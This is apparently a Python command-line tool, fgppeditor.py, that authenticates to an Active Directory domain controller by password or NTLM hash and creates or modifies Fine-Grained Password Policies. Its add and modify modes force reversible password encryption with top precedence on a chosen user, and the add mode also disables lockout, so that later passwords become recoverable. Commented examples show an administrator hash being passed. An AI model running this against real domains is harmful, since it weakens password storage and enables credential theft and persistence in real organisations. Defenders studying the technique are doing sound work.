from ldap3 import Server, Connection, ALL,SUBTREE,NTLM, MODIFY_REPLACE,MODIFY_ADD
import json
import argparse

def ldapAuth(host,username,password,authType):
    if(authType=='pass'):
        server = Server(host,get_info=ALL)
        c = Connection(server, user=username, password=password,auto_bind=True)
        infoJson=json.loads(server.info.to_json())
        return c,"".join(infoJson["raw"]["rootDomainNamingContext"])
    if(authType=='hash'):
        server = Server(host,get_info=ALL)
        c = Connection(server, user=username, password=password,auto_bind=True, authentication=NTLM)
        infoJson=json.loads(server.info.to_json())
        return c,"".join(infoJson["raw"]["rootDomainNamingContext"])


def getFGPP(c,rootDomainNamingContext):
    total_entries = 0
    c.search(search_base = "CN=Password Settings Container,CN=System,"+rootDomainNamingContext,
         search_filter = '(objectClass=msDS-PasswordSettings)',
         search_scope = SUBTREE,
         attributes = ['cn','objectGUID', 'msDS-PasswordReversibleEncryptionEnabled','msDS-PSOAppliesTo','msDS-PasswordSettingsPrecedence'])
    total_entries += len(c.response)
    print("getting exist fgpp info...")
    for entry in c.response:
        print("----------------------")
        print("dn",entry['dn'])
        print("msDS-PasswordSettingsPrecedence",entry['attributes']['msDS-PasswordSettingsPrecedence'])
        print("objectGUID",entry['attributes']['objectGUID'])
        print("msDS-PasswordReversibleEncryptionEnabled",entry['attributes']['msDS-PasswordReversibleEncryptionEnabled'])
        print("msDS-PSOAppliesTo",entry['attributes']['msDS-PSOAppliesTo'])
    print("----------------------")
    print("done")



def addFGPP(c,fgppName,target,rootDomainNamingContext):
    c.add('cn='+fgppName+',CN=Password Settings Container,CN=System,'+rootDomainNamingContext, attributes={
        'objectClass':  ['top','msDS-PasswordSettings'], 
        'msDS-LockoutDuration': -18000000000,
        'msDS-LockoutObservationWindow': -18000000000,
        'msDS-LockoutThreshold': 0,
        'msDS-MaximumPasswordAge': -36288000000000, 
        'msDS-MinimumPasswordAge': -864000000000, 
        'msDS-MinimumPasswordLength': 8, 
        'msDS-PasswordComplexityEnabled': 'TRUE',
        'msDS-PasswordHistoryLength': 24, 
        'msDS-PasswordReversibleEncryptionEnabled': 'TRUE', 
        'msDS-PasswordSettingsPrecedence': 1,
        'msDS-PSOAppliesTo':target
        })
    print(c.result)

def modifyFGPPReversibleEncryption(c,fgppName,rootDomainNamingContext):
    c.modify('cn='+fgppName+',CN=Password Settings Container,CN=System,'+rootDomainNamingContext, {
        'msDS-PasswordReversibleEncryptionEnabled': [(MODIFY_REPLACE, ['TRUE'])]
        })
    print(c.result)

def modifyFGPPAppliesTo(c,fgppName,target,rootDomainNamingContext):
    c.modify('cn='+fgppName+',CN=Password Settings Container,CN=System,'+rootDomainNamingContext, {
        'msDS-PSOAppliesTo': [(MODIFY_ADD, [target])]
        })
    print(c.result)

def modifyFGPPPrecedence(c,fgppName,pValue,rootDomainNamingContext):
    c.modify('cn='+fgppName+',CN=Password Settings Container,CN=System,'+rootDomainNamingContext, {
        'msDS-PasswordSettingsPrecedence': [(MODIFY_REPLACE, [pValue])]
        })
    print(c.result)

#c,rootDomainNamingContext=ldapAuth('192.168.123.123',"domain\\administrator","123456",'pass')
#c,rootDomainNamingContext=ldapAuth('192.168.123.123',"domain\\administrator","aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4",'hash')
#getFGPP(c,rootDomainNamingContext)
#modifyFGPPReversibleEncryption(c,'test1',rootDomainNamingContext)
#modifyFGPPAppliesTo(c,'test1',"CN=tom,CN=Users,DC=testdomain,DC=test",rootDomainNamingContext)
#modifyFGPPPrecedence(c,'test1',123,rootDomainNamingContext)
#addFGPP(c,'xtest',"CN=tom,CN=Users,DC=testdomain,DC=test",rootDomainNamingContext)
#c.unbind()
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='fgppeditor.py -host 192.168.123.123 -u "domain\\admin" -p "123456" -type pass -mode xxxx')
    parser.add_argument('-host',help='192.168.123.123')
    parser.add_argument('-u',help='domain\\domainadmin')
    parser.add_argument('-p',help='pass or hash')
    parser.add_argument('-type',help='pass,hash')
    parser.add_argument('-mode',help='list,add,modreverse,modapplyto,modprecedence')
    parser.add_argument('-name',help='fgpp name')
    parser.add_argument('-applyto',help='CN=tom,CN=Users,DC=testdomain,DC=test')
    parser.add_argument('-precedence',type=int,help='set precedence')
    args = parser.parse_args()

    try:
        if(args.host is not None and args.p is not None and args.u is not None and args.mode is not None and (args.type=="pass" or args.type=="hash")):
            pass
        else:
            parser.print_help()
            quit()
    except:
        quit()

    if(args.mode=="list"):
        c,rootDomainNamingContext=ldapAuth(args.host,args.u,args.p,args.type)
        getFGPP(c,rootDomainNamingContext)
        c.unbind()
        quit()

    if(args.mode=="add"):
        if(args.name is not None and args.applyto is not None):
            c,rootDomainNamingContext=ldapAuth(args.host,args.u,args.p,args.type)
            addFGPP(c,args.name,args.applyto,rootDomainNamingContext)
            c.unbind()
        else:
            print("mode add need to set name and applyto")
        quit()

        

    if(args.mode=="modreverse"):
        if(args.name is not None):
            c,rootDomainNamingContext=ldapAuth(args.host,args.u,args.p,args.type)
            modifyFGPPReversibleEncryption(c,args.name,rootDomainNamingContext)
            c.unbind()
        else:
            print("mode modreverse need to set fgpp name")
        quit()
        


    if(args.mode=="modapplyto"):
        if(args.name is not None and args.applyto is not None):
            c,rootDomainNamingContext=ldapAuth(args.host,args.u,args.p,args.type)
            modifyFGPPAppliesTo(c,args.name,args.applyto,rootDomainNamingContext)
            c.unbind()
        else:
            print("mode modapplyto need to set applyto")
        quit()

        


    if(args.mode=="modprecedence"):
        if(args.name is not None and args.precedence is not None):
            c,rootDomainNamingContext=ldapAuth(args.host,args.u,args.p,args.type)
            modifyFGPPPrecedence(c,args.name,args.precedence,rootDomainNamingContext)
            c.unbind()
        else:
            print("mode modprecedence need to set fgpp name and precedence")
        quit()
        



    parser.print_help()
